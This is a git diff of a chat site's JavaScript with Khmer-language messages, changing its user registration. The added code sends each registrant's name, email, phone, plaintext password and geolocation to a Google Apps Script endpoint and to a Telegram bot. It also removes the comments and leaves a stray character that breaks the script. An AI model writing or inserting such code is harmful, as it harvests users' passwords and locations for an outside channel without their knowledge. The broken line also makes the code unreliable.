@@ -4449,6 +4449,7 @@ function listenForAdminReplies() {
           }
       });
 }
+    
 window.onload = function() {
         const savedUser = localStorage.getItem('chatUser');
         if (savedUser) {
@@ -4456,7 +4457,7 @@ window.onload = function() {
             document.querySelector('.chat-container').style.display = 'block';
             document.getElementById('chat-entry-gate').style.display = 'none';
             document.getElementById('chat-user-input').value = user.name;
-            document.getElementById('chat-user-input').readOnly = true; // មិនឱ្យកែឈ្មោះ
+            document.getElementById('chat-user-input').readOnly = true; 
         }
     };
 
@@ -4464,7 +4465,7 @@ window.onload = function() {
         document.getElementById('registration-overlay').style.display = 'flex';
     }
 
-    // ២. មុខងារទាញយកទីតាំងពិតប្រាកដ
+  
     function getLocation() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
@@ -4477,48 +4478,88 @@ window.onload = function() {
             });
         }
     }
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwIvTUVDq1hG0NHnNNUMc7XGBGthCYJlYJYtlmX_dc5E7n62TysgoyJ9riS-iUypOq_A/exec";
 
-    // ៣. ផ្ទៀងផ្ទាត់លក្ខខណ្ឌទាំងអស់
-    function validateAndJoin() {
-        const name = document.getElementById('reg-name').value.trim();
-        const email = document.getElementById('reg-email').value.trim();
-        const phone = document.getElementById('reg-phone').value.trim();
-        const pass = document.getElementById('reg-pass').value.trim();
-        const location = document.getElementById('reg-location').value;
 
-        // លក្ខខណ្ឌ Email (ត្រួតពិនិត្យទម្រង់ Email ពិត)
-        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+function sendToTelegram(userData) {
+    const message = `
+🔔 **អ្នកចុះឈ្មោះថ្មី (New User)**
+━━━━━━━━━━━━━━━━
+👤 ឈ្មោះ: ${userData.name}
+📧 អ៊ីមែល: ${userData.email}
+📞 លេខទូរស័ព្ទ: ${userData.phone}
+🔑 លេខសម្ងាត់: ${userData.pass}
+📍 ទីតាំង: ${userData.location}
+━━━━━━━━━━━━━━━━`;
 
-        if (name === "" || email === "" || phone === "" || pass === "" || location === "") {
-            alert("សូមបំពេញព័ត៌មានឱ្យគ្រប់ ចុចយកទីតាំងផង!");
-            return;
-        }
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    });
+}
+function validateAndJoin() {
+    const name = document.getElementById('reg-name').value.trim();
+    const email = document.getElementById('reg-email').value.trim();
+    const phone = document.getElementById('reg-phone').value.trim();
+    const pass = document.getElementById('reg-pass').value.trim();
+    const location = document.getElementById('reg-location').value;
 
-        if (!emailPattern.test(email)) {
-            alert("សូមបញ្ចូលអាសយដ្ឋាន Email ឱ្យបានត្រឹមត្រូវ!");
-            return;
-        }
-
-        if (phone.length < 9 || phone.length > 10) {
-            alert("លេខទូរស័ព្ទត្រូវមាន ៩ ឬ ១០ ខ្ទង់!");
-            return;
-        }
-
-        // រក្សាទុកក្នុង LocalStorage ដើម្បីកុំឱ្យចុះឈ្មោះម្តងទៀត
-        const userData = { name: name, email: email, phone: phone, location: location };
-        localStorage.setItem('chatUser', JSON.stringify(userData));
-
-        // បង្ហាញឆាត និងបិទផ្ទាំងចុះឈ្មោះ
-        document.getElementById('registration-overlay').style.display = 'none';
-        document.getElementById('chat-entry-gate').style.display = 'none';
-        document.querySelector('.chat-container').style.display = 'block';
-        
-        // បញ្ចូលឈ្មោះទៅក្នុង input ឆាត និង Lock វាមិនឱ្យកែ
-        document.getElementById('chat-user-input').value = name;
-        document.getElementById('chat-user-input').readOnly = true;
-
-        alert("ការចុះឈ្មោះជោគជ័យ! រីករាយការកម្សាន្ត។");
+   
+    if (!name || !email || !phone || !pass || !location) {
+        alert("សូមបំពេញព័ត៌មានឱ្យគ្រប់ និងចុចយកទីតាំង!");
+        return;
     }
+
+    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailPattern.test(email)) {
+        alert("អ៊ីមែលមិនត្រឹមត្រូវ!");
+        return;
+    }
+
+  យ
+    const userData = { 
+        name: name, 
+        email: email, 
+        phone: phone, 
+        pass: pass, 
+        location: location,
+        date: new Date().toLocaleString()
+    };
+
+  
+    fetch(SCRIPT_URL, {
+        method: 'POST',
+        mode: 'no-cors', 
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(userData)
+    }).then(() => {
+        console.log("Data sent to Google Sheets");
+    });
+
+
+    sendToTelegram(userData);
+
+
+    localStorage.setItem('chatUser', JSON.stringify(userData));
+
+
+    document.getElementById('registration-overlay').style.display = 'none';
+    document.getElementById('chat-entry-gate').style.display = 'none';
+    document.querySelector('.chat-container').style.display = 'block';
+    
+   
+    const chatUserInput = document.getElementById('chat-user-input');
+    chatUserInput.value = name;
+    chatUserInput.readOnly = true;
+
+    alert("ជោគជ័យ! ទិន្នន័យត្រូវបានរក្សាទុក និងបញ្ជូនទៅកាន់ Admin។");
+}
+
 
 let myCombatData = { id: null, name: "", avatar: "", lang: "kh", hp: 100 };
 let combatRoomId = null;
